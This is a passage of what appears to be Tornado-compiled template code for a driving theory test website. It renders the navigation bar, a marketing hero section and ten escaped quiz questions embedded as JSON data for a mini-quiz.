 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
